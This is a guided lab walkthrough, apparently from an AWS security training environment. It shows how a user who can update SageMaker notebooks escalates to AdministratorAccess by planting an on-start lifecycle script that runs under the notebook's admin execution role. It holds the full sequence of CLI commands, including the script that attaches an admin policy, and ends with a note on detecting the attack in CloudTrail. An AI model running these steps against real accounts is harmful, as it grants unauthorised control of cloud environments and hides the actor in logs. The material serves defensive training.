# Guided Walkthrough: Privilege Escalation via SageMaker UpdateNotebook Lifecycle Config

This scenario demonstrates a sophisticated privilege escalation vulnerability where a user with SageMaker notebook management permissions can inject malicious code into an existing notebook instance that executes with highly privileged credentials. SageMaker notebook instances run with IAM execution roles, and lifecycle configurations allow administrators to specify scripts that run automatically when the notebook starts or is created. Critically, these lifecycle scripts execute with the notebook's execution role credentials, not the credentials of the user who modified the configuration.

When a notebook instance is configured with an administrative execution role — a common practice to allow data scientists broad access to AWS services — an attacker with permissions to update the notebook's lifecycle configuration can inject arbitrary code that will execute with those admin privileges. The attack involves stopping the notebook, creating a malicious lifecycle configuration, attaching it to the notebook, and starting the notebook again. Upon startup, the lifecycle script automatically executes with the notebook's admin role credentials, allowing the attacker to grant themselves administrative access or perform any other privileged operations.

This privilege escalation path is particularly dangerous because it abuses a legitimate SageMaker feature. Organizations often grant SageMaker update permissions broadly to data science teams without realizing that these permissions, combined with privileged notebook execution roles, create a direct path to administrative access. The attack leaves minimal forensic evidence in standard CloudTrail logs, as the malicious actions appear to be performed by the notebook's execution role rather than the attacker's user account.

This scenario is based on research published by Plerion: [Privilege Escalation with SageMaker and Execution Roles](https://www.plerion.com/blog/privilege-escalation-with-sagemaker-and-execution-roles)

## The Challenge

You start as `pl-prod-sagemaker-005-to-admin-starting-user`, an IAM user with SageMaker notebook management permissions. Your goal is to reach the `pl-prod-sagemaker-005-to-admin-notebook-role`, an IAM role with AdministratorAccess that serves as the execution role for an existing SageMaker notebook instance.

The notebook `pl-prod-sagemaker-005-to-admin-notebook` is running with this privileged role. You have permissions to stop it, create lifecycle configurations, update its configuration, and start it again — but you cannot assume the notebook role directly. The question is: can you make the notebook do your bidding?

## Reconnaissance

First, let's confirm who we are and establish our baseline.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-sagemaker-005-to-admin-starting-user
```

Verify we don't have admin access yet — this should fail:

```bash
aws iam list-users --max-items 1
# An error occurred (AccessDenied) ...
```

Now let's discover the target notebook. With `sagemaker:ListNotebookInstances` available, we can see what's in the environment:

```bash
aws sagemaker list-notebook-instances --region us-east-1 --output table
```

Describe the specific target to confirm it's running with a privileged execution role:

```bash
aws sagemaker describe-notebook-instance \
    --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook \
    --region us-east-1 \
    --output json
```

Look at the `RoleArn` field — it points to `pl-prod-sagemaker-005-to-admin-notebook-role`. Let's confirm that role has admin access:

```bash
aws iam list-attached-role-policies \
    --role-name pl-prod-sagemaker-005-to-admin-notebook-role \
    --output table
# Returns: arn:aws:iam::aws:policy/AdministratorAccess
```

There it is. The notebook runs with an admin role, and you can modify its lifecycle configuration. Lifecycle scripts run automatically on startup with the notebook's execution role. This is your attack path.

## Exploitation

### Step 1: Stop the notebook

SageMaker only allows lifecycle configuration changes when the notebook is in the `Stopped` state. Stop it first:

```bash
aws sagemaker stop-notebook-instance \
    --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook \
    --region us-east-1
```

Poll until the status reaches `Stopped` (typically 2-3 minutes):

```bash
aws sagemaker describe-notebook-instance \
    --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook \
    --region us-east-1 \
    --query 'NotebookInstanceStatus' \
    --output text
```

### Step 2: Create the malicious lifecycle configuration

Now craft a lifecycle script that will run with the notebook's admin role credentials. The script uses `iam:AttachUserPolicy` to grant `AdministratorAccess` to your starting user:

```bash
LIFECYCLE_SCRIPT='#!/bin/bash
export AWS_PAGER=""
echo "Lifecycle script executing with notebook role credentials..."
aws iam attach-user-policy \
    --user-name pl-prod-sagemaker-005-to-admin-starting-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
echo "Successfully granted AdministratorAccess to starting user"
'

ENCODED_SCRIPT=$(echo "$LIFECYCLE_SCRIPT" | base64)

aws sagemaker create-notebook-instance-lifecycle-config \
    --notebook-instance-lifecycle-config-name pl-malicious-lifecycle-config \
    --region us-east-1 \
    --on-start Content="$ENCODED_SCRIPT" \
    --output json
```

The `--on-start` parameter means this script runs every time the notebook starts, not just on creation. SageMaker accepts the script as base64-encoded content.

### Step 3: Attach the lifecycle config to the notebook

Update the notebook instance to use your malicious lifecycle configuration:

```bash
aws sagemaker update-notebook-instance \
    --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook \
    --lifecycle-config-name pl-malicious-lifecycle-config \
    --region us-east-1
```

Wait for the update to complete — the notebook will return to `Stopped` status.

### Step 4: Start the notebook (trigger execution)

This is the key step. Starting the notebook causes SageMaker to run all `on-start` lifecycle scripts with the notebook's execution role credentials:

```bash
aws sagemaker start-notebook-instance \
    --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook \
    --region us-east-1
```

Wait for the notebook to reach `InService` status — this takes 5-8 minutes. During this window, your lifecycle script is running as `pl-prod-sagemaker-005-to-admin-notebook-role` (AdministratorAccess) and is attaching the `AdministratorAccess` policy to your user.

### Step 5: Wait for IAM propagation

After the notebook is in service, wait 15 seconds for IAM policy changes to propagate:

```bash
sleep 15
```

## Verification

Confirm the `AdministratorAccess` policy is now attached to your user:

```bash
aws iam list-attached-user-policies \
    --user-name pl-prod-sagemaker-005-to-admin-starting-user \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text
# arn:aws:iam::aws:policy/AdministratorAccess
```

Now re-test the admin action that failed earlier:

```bash
aws iam list-users --max-items 3 --output table
# Success — you have full administrator access
```

## What Happened

You exploited the fact that SageMaker notebook lifecycle configurations execute with the notebook's IAM execution role — not the credentials of the user who created or modified the configuration. By injecting a malicious `on-start` script and triggering a notebook restart, you caused the admin role to run your code, which granted your user account administrative permissions.

This technique is representative of a broader class of "execution role abuse" attacks in AWS. Any managed service that runs code with an attached IAM role — Lambda, ECS tasks, Glue jobs, SageMaker notebooks — is a potential pivot point if an attacker can modify what code that service runs. The unique danger here is the delay: the malicious action happens minutes after the initial configuration change, making correlation harder and alert fatigue more likely.

In real environments, this attack is particularly stealthy because the `iam:AttachUserPolicy` call in CloudTrail shows the notebook's execution role as the caller, not the starting user. Defenders need to correlate the earlier `UpdateNotebookInstance` event (your action) with the later policy attachment (the role's action) to reconstruct the full picture.
